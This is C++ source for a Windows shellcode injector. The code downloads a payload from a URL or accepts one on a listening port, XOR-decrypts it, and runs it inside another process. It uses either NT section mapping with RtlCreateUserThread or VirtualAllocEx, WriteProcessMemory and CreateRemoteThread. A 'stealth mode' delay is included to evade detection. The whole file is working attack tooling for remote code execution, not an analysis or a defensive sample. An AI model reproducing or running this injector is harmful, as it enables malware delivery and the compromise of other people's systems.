// NativeInjection.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include "NTAPIs.hpp"
#include "Download_shellcode.h"
#include "arg_parser.h"
#include "listener.h"

HANDLE MyNtOpenProcess(DWORD dwDesiredAccess, DWORD dwProcessId)
{
	CLIENT_ID cid = { (HANDLE)dwProcessId, NULL };

	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, 0, 0, 0, 0);

	HANDLE hProcess = NULL;
	NTSTATUS ntStatus = NtOpenProcess(&hProcess, dwDesiredAccess, &oa, &cid);

	SetLastError(ntStatus);
	return hProcess;
}

BOOL InitializeNTAPIs()
{
	HMODULE hNtdll = GetModuleHandleA("ntdll");
	if (!hNtdll)
		return FALSE;

	NtOpenProcess = (TNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
	if (!NtOpenProcess)
	{
		printf("[-] Could not get ntOpenProcess\n");
		return FALSE;
	}

	fNtCreateSection = (myNtCreateSection)(GetProcAddress(hNtdll, "NtCreateSection"));
	if (!fNtCreateSection)
	{
		printf("[-] Could not get fNtCreateSection\n");
		return FALSE;
	}
	fNtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(hNtdll, "NtMapViewOfSection"));
	if (!fNtMapViewOfSection)
	{
		printf("[-] Could not get fNtMapViewOfSection\n");
		return FALSE;
	}

	fRtlCreateUserThread = (myRtlCreateUserThread)(GetProcAddress(hNtdll, "RtlCreateUserThread"));
	if (!fRtlCreateUserThread)
	{
		printf("[-] Could not get fRtlCreateUserThread\n");
		return FALSE;
	}
	return TRUE;
}

HANDLE injectShellcode(char* shellcode, SIZE_T size, DWORD pid, int key)
{
	printf("[*] The shellcode size is: %d\n", size);

	if (key != 0)
		for (int i = 0; i < size; i++)
			shellcode[i] ^= key;

	// Init variables
	LARGE_INTEGER sectionSize = { size };
	HANDLE sectionHandle = NULL;
	PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;

	// Init NT APIs
	if (!InitializeNTAPIs())
		return NULL;

	// Create a memory section
	fNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	// Create a view of the memory section in the local process
	fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);

	// Get handle on pid
	HANDLE targetHandle = MyNtOpenProcess(PROCESS_ALL_ACCESS, pid);
	if (targetHandle != NULL)
		printf("[+] Got handle\n");
	else
	{
		printf("[-] Could not get handle\n");
		return NULL;
	}

	// create a view of the memory section in the target process
	fNtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);

	// Copy shellcode to the local view, which will get reflected in the target process's mapped view
	memcpy(localSectionAddress, shellcode, size);
	printf("[+] Copied to local view\n");

	// Attempting to create remote thread on the remote process in order to trigger the shellcode
	HANDLE targetThreadHandle = NULL;
	fRtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL);
	if (targetThreadHandle != NULL)
		printf("[+] Remote thread started successfully!\n");

	// Cleanup
	CloseHandle(targetHandle);

	return targetThreadHandle;
}

HANDLE normalInjectShellcode(char* shellcode, SIZE_T size, DWORD pid, int key)
{
	HANDLE processHandle = NULL;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	// Decrypt with your xor key
	if (key != 0)
		for (int i = 0; i < size; i++)
			shellcode[i] ^= key;

	// Get handle to process
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (processHandle == NULL)
	{
		printf("[-] Could not get handle\n");
		return NULL;
	}

	printf("[*] Injecting to PID: %i\n", pid);

	// Allocate memory for shellcode
	remoteBuffer = VirtualAllocEx(processHandle, NULL, size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

	// Write shellcode buffer to the allocated memory
	WriteProcessMemory(processHandle, (LPVOID)remoteBuffer, shellcode, size, NULL);

	// Create remote thread in memory of the process to execute the shellcode
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	if (remoteThread != NULL)
		printf("[+] Remote thread started successfully!\n");

	// Close handle to the process
	CloseHandle(processHandle);

	return remoteThread;
}

DWORD findProcess(char *process)
{
	DWORD pid = 0;
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			if (strcmp(entry.szExeFile, process) == 0)
			{
				// Found
				pid = entry.th32ProcessID;
				printf("[+] Found PID: %d\n", pid);
			}
		}
	}

	CloseHandle(snapshot);
	
	if (pid == 0)
	{
		printf("[-] %s not found\n", process);
		exit(-1);
	}
	return pid;
}

int main(int argc, char ** argv)
{
	DWORD pid = 0;
	char* url, *port, * shellcode;
	int shellcode_size = 0, key = 0;

	if (cmdOptionExists(argv, argv + argc, "-h") || // Help
		(!cmdOptionExists(argv, argv + argc, "-u") && !cmdOptionExists(argv, argv + argc, "-l")) || // Incase listen mode and url not given
		(cmdOptionExists(argv, argv + argc, "-u") && cmdOptionExists(argv, argv + argc, "-l"))) // Incase both given
	{
		printf("Usage:\n"
			"\tInjector.exe -u <URL> [-k <xor_key>]\n"
			"\tInjector.exe -p <PID/Process Name> -u <URL> [-k <xor_key>]\n"
			"\tInjector.exe -p <PID/Process Name> -l <LISTEN_PORT> [-k <xor_key>]\n"
			"\tInjector.exe -h\n"
			"Options:\n"
			"\t-h \t Show this menu.\n"
			"\t-u \t URL to donwload shellcode from (Not listen mode).\n"
			"\t-p \t PID/Process name to be injected (Optional).\n"
			"\t-l \t Listen mode port (Not download mode).\n"
			"\t-k \t XOR key to use for decryption.\n"
			"\t-s \t Stealth mode - the decryption and injection will start after given seconds (Default 18).\n"
			"\t-m \t Injection mode - NT or normal(VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)\n"
		);
		return 1;
	}

	if (!cmdOptionExists(argv, argv + argc, "-p"))	// Creates process incase PID not given
	{
		PROCESS_INFORMATION pi = { 0 };
		STARTUPINFO si = { 0 };
		si.cb = sizeof(STARTUPINFO);
		const char notepad[] = "c:\\windows\\system32\\notepad.exe";
		CreateProcessA(notepad, (LPSTR)notepad, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
		pid = pi.dwProcessId;
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	else											// Get PID
	{
		pid = atoi(getCmdOption(argv, argv + argc, "-p"));
		if (pid == 0)
			pid = findProcess(getCmdOption(argv, argv + argc, "-p"));
	}

	if (cmdOptionExists(argv, argv + argc, "-u"))	// Download shellcode from URL
	{
		url = getCmdOption(argv, argv + argc, "-u");
		string downloaded_shellcode = download(url);
		shellcode = (char*)downloaded_shellcode.c_str();
		shellcode_size = downloaded_shellcode.size();
	}
	else											// Listen mode - bind port and wait for shellcode
	{
		recv_shell r;
		port = getCmdOption(argv, argv + argc, "-l");
		r = start_listen(port);
		shellcode = r.bufferReceivedBytes;
		shellcode_size = r.receivedBytes;
	}
	if (cmdOptionExists(argv, argv + argc, "-k")) // XOR key
		key = atoi(getCmdOption(argv, argv + argc, "-k"));

	if (cmdOptionExists(argv, argv + argc, "-s"))	// Stealth mode
	{
		time_t s = time(0);
		int sec = 0;
		try
		{
			sec = atoi(getCmdOption(argv, argv + argc, "-s"));
		}
		catch (...)
		{
		}

		if (sec == 0)
			sec = 18;

		printf("\n*\tIn stealth mode, waiting for %d seconds\t*\n\n", sec);
		while (time(0) - s <= sec) { printf("\r\t%d Seconds", (time(0) - s)); }
		printf("\n");
	}

	if (cmdOptionExists(argv, argv + argc, "-m"))
	{
		char* mode = getCmdOption(argv, argv + argc, "-m");
		if (strcmp(mode, "normal") == 0)
			normalInjectShellcode(shellcode, shellcode_size, pid, key); // Normal injection
		else
			injectShellcode(shellcode, shellcode_size, pid, key); // NT injection
	}
	else
		injectShellcode(shellcode, shellcode_size, pid, key); // Inject
	return 0;
}
